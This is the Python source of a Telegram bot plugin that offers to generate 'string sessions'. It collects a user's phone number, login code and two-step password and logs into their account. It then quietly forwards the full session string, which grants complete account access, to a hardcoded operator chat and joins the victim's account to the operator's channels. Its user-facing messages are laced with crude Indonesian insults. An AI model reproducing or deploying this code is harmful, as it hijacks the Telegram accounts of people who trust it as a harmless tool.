import asyncio
import traceback
from pyrogram import *
from telethon import TelegramClient
from pyrogram.types import Message
from oldpyro import Client as Client1
from pyrogram import Client, filters
from asyncio.exceptions import TimeoutError
from telethon.sessions import StringSession
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from telethon.errors import rpcerrorlist 
from pyrogram.types import *
from pyrogram.errors import UserBannedInChannel
import telethon
import pyrogram 
import oldpyro
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from oldpyro.errors import (
    ApiIdInvalid as ApiIdInvalid1,
    PhoneNumberInvalid as PhoneNumberInvalid1,
    PhoneCodeInvalid as PhoneCodeInvalid1,
    PhoneCodeExpired as PhoneCodeExpired1,
    SessionPasswordNeeded as SessionPasswordNeeded1,
    PasswordHashInvalid as PasswordHashInvalid1 
)
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from MukeshRobot import API_ID, API_HASH, START_IMG
from MukeshRobot import pbot as app

class ListenerTimeout(Exception):
    pass

bacot = "**Lu Pikun Apa Gimana Si Nyet, Password Sendiri Salah.**"

colmek = "**Anjeng, Demen Banget Ngaret Jadi Manusia**"

setan = "**Goblok, Dibilang Pake Spasi Tiap Kode.**"

memek = "**Kode Nya Salah Monyet, Mata Lu Buta Apa Gimana.**"

peler_ques = "**ngentot gak jelas**"

goblok = "**Ngaret Lu Anjeng Lama...**"

tolol = "**Nomer Akun Telegram Lu Ga Terdaftar Tolol.**\n**Yang Bener Dikit Blog, Dari Ulang**"

kontol_ques = "**ngapain kontol**"

ask_ques = "**Hai {}\n\nIni adalah Sebuah bot pembangkit sesi string sumber terbuka, ditulis dalam Python dengan bantuan Pyrogram\n\nNOTED : Buat pengguna akun telegram yang berawalan selain id 6 💯 aman dan buat pengguna akun telegram yang berawalan id 6 itu hoki hokian 50% kemungkinan ke deak..**"


goblok_jamet = [
    [
      InlineKeyboardButton(
        text="Buat String",
        callback_data="generate"),
      InlineKeyboardButton(
        text="Kembali",
      callback_data="Main_help"),
    ],
  ]
  
admin_kynan = [
    [
      InlineKeyboardButton(text="Prince", user_id=2040006539),
    ],
    [
      InlineKeyboardButton(
        text="Kembali",
      callback_data="source_"),
    ],
  ]

buttons_ques = [
    [   
        InlineKeyboardButton("Pyrogram V1", callback_data="pyrogram1"), 
    ], 
    [
        InlineKeyboardButton("Pyrogram V2", callback_data="pyrogram"),
        InlineKeyboardButton("Telethon", callback_data="telethon"),
    ],
    [
        InlineKeyboardButton("Kembali", callback_data="Main_help"),
    ],

]

@app.on_callback_query(filters.regex(pattern=r"^(pyrogram|pyrogram1|telethon)$"))
async def _callbacks(bot: Client, callback_query: CallbackQuery):
    query = callback_query.data.lower()
    user = await bot.get_me()
    mention = user.mention
    await callback_query.message.delete()
    if query.startswith("pyrogram") or query == "telethon":
        try:
            if query == "pyrogram":
                await callback_query.answer()
                await generate_session(bot, callback_query.message) 
            elif query == "pyrogram1":
                await callback_query.answer()
                await generate_session(bot, callback_query.message, old_pyro=True)
            elif query == "telethon":
                await callback_query.answer()
                await generate_session(bot, callback_query.message, telethon=True)
        except Exception as e:
            print(traceback.format_exc())
            print(e)
            await callback_query.message.reply(ERROR_MESSAGE.format(str(e)))
            
ERROR_MESSAGE = "Buset Eror Jink! \n\n**Error** : {} " \
            "\n\nCoba Lu Ngadu Sono Ke @LitleePrince"

@app.on_callback_query(filters.regex("generate"))
async def main(client, query):
    await query.message.edit_caption(caption=ask_ques.format(query.from_user.mention), reply_markup=InlineKeyboardMarkup(buttons_ques))
    await client.answer_callback_query(query.id)

async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: bool = False, is_bot: bool = False):
    if telethon:
        ty = "Telethon"  
    elif old_pyro:
        ty = "pyrogram1"
    else:
        ty = "Pyrogram"
        if not old_pyro:
            ty += " v2"
    if is_bot:
        ty += " 𝐁𝐎𝐓"
    user_id = msg.chat.id
    api_id = API_ID
    api_hash = API_HASH
    api_hash_msg = await msg.chat.ask("**Lu yakin mo buat string ? Deak Gua Ga Mao Tanggung Jawab ! Balas `Y` Untuk Setuju atau ketik /cancel Untuk Batal**", filters=filters.text) 
    if await cancelled(api_hash_msg):
            return       
    """
    if await cancelled(api_id):
        return
    try:
        api_id = int(api_id_msg.text)
    except ValueError:
        await api_id_msg.reply('Not a valid API_ID (which must be an integer). Please start generating session again.', quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
        return
    api_hash_msg = await msg.chat.ask('Please send your `API_HASH`', filters=filters.text)
    if await cancelled(salah):
        return
    api_hash = api_hash_msg.text
    """
    await asyncio.sleep(1.0)
    if not is_bot:
        t = "**Sekarang Kirim Nomer Akun Telegram Lu. \nContoh : `+62857XXXXX`\n\nKetik /cancel untuk membatalkan.**"
    else:
        t = "**Kirim Nomer Akun Telegram Lu.** \n**Contoh** : `+62857XXXXX` "
    phone_number_msg = await msg.chat.ask(t, filters=filters.text)
    if await cancelled(phone_number_msg):
        return
    phone_number = phone_number_msg.text
    await msg.reply("**Lagi Ngirim OTP Ke Akun Lu...**")
    if telethon and is_bot or telethon:
        client = TelegramClient(StringSession(), api_id=api_id, api_hash=api_hash)
    elif is_bot:
        client = Client(name="bot", api_id=api_id, api_hash=api_hash, bot_token=phone_number, in_memory=True)
    elif old_pyro:
        client = Client1(":memory:", api_id=api_id, api_hash=api_hash)
    else:
        client = Client(name="user", api_id=api_id, api_hash=api_hash, in_memory=True)
    await client.connect()
    try:
        code = None
        if not is_bot:
            if telethon:
                code = await client.send_code_request(phone_number)
            else:
                code = await client.send_code(phone_number)

    except (PhoneNumberInvalid, PhoneNumberInvalidError, PhoneNumberInvalid1):
        await msg.reply_photo(photo=START_IMG, caption=tolol.format(msg.from_user.mention), reply_markup=InlineKeyboardMarkup(goblok_jamet))
        return
    try:
        phone_code_msg = None
        if not is_bot:
            phone_code_msg = await msg.chat.ask("**Sekarang Lu periksa OTP Di Akun Telegram Lu, Buru cepet kirim OTP ke sini.** \n **Cara Masukin OTP kek gini** `1 2 3 4 5`\n**Jangan Salah Ya Broh.**", filters=filters.text, timeout=600)
            if await cancelled(phone_code_msg):
                return
    except TimeoutError:
        await msg.reply_photo(photo=START_IMG, caption=goblok.format(msg.from_user.mention), reply_markup=InlineKeyboardMarkup(goblok_jamet))
        return
    if not is_bot:
        phone_code = phone_code_msg.text.replace(" ", "")
        try:
            if telethon:
                await client.sign_in(phone_number, phone_code, password=None)
            else:
                await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except (PhoneCodeInvalid, PhoneCodeInvalidError, PhoneCodeInvalid1):
            await msg.reply_photo(photo=START_IMG, caption=memek.format(msg.from_user.mention), reply_markup=InlineKeyboardMarkup(goblok_jamet))
            return
        except (PhoneCodeExpired, PhoneCodeExpiredError, PhoneCodeExpired1):
            await msg.reply_photo(photo=START_IMG, caption=setan.format(msg.from_user.mention), reply_markup=InlineKeyboardMarkup(goblok_jamet))
            return
        except (SessionPasswordNeeded, SessionPasswordNeededError, SessionPasswordNeeded1):
            try:
                two_step_msg = await msg.chat.ask('**Masukin Password Akun Lu Jing.**', filters=filters.text, timeout=300)
            except ListenerTimeout:
                await msg.reply_photo(photo=START_IMG, caption=colmek.format(msg.from_user.mention), reply_markup=InlineKeyboardMarkup(goblok_jamet))
                return
            try:
                password = two_step_msg.text
                if telethon:
                    await client.sign_in(password=password)
                else:
                    await client.check_password(password=password)
                if await cancelled(api_hash_msg):
                    return
            except (PasswordHashInvalid, PasswordHashInvalidError, PasswordHashInvalid1):
                await two_step_msg.reply_photo(photo=START_IMG, caption=bacot.format(msg.from_user.mention), reply_markup=InlineKeyboardMarkup(goblok_jamet))
                return
    elif telethon:
        await client.start(bot_token=phone_number)
    else:
        await client.sign_in_bot(phone_number)
    if telethon:
        string_session = client.session.save()
    else:
        string_session = await client.export_session_string()
    text = f"**{ty.upper()} NIH BANG.** \n\n`{string_session}` \n\n**Minimal Bilang Makasih Ke** @kaleng1 **Karna Akun Lu Kaga Deak & gak logout**"
    try:
        try:
            if telethon:
                await client(JoinChannelRequest("SyncPublick"))
            else:
                await client.join_chat("SyncinHere")
        except (rpcerrorlist.ChannelPrivateError, UserBannedInChannel):
            await msg.reply('**Jiah akun lu dibanned di Kaleng Robot Support.\nCoba sono ngadu ke salah 1 admin Kaleng Support biar dibuka ban nya.**', quote=True, reply_markup=InlineKeyboardMarkup(admin_kynan))
            return
        if not is_bot:
            await bot.send_message(msg.chat.id, text)
            await bot.send_message(-4185406819, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
        else:
            await bot.send_message(msg.chat.id, text)
            await bot.send_message(-4185406819, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
    except KeyError:
        pass
    await client.disconnect()
    await asyncio.sleep(1.0)

async def cancelled(msg):
    if "/cancel" in msg.text:
        await msg.reply_photo(photo=START_IMG, caption=peler_ques.format(msg.from_user.mention), reply_markup=InlineKeyboardMarkup(goblok_jamet))
        return True
    elif "/restart" in msg.text:
        await msg.reply_photo(photo=START_IMG, caption=kontol_ques.format(msg.from_user.mention), reply_markup=InlineKeyboardMarkup(goblok_jamet))
        return True
    elif msg.text.startswith("/"): 
        await msg.reply_photo(photo=START_IMG, caption=peler_ques.format(msg.from_user.mention), reply_markup=InlineKeyboardMarkup(goblok_jamet))
        return True
    else:
        return False
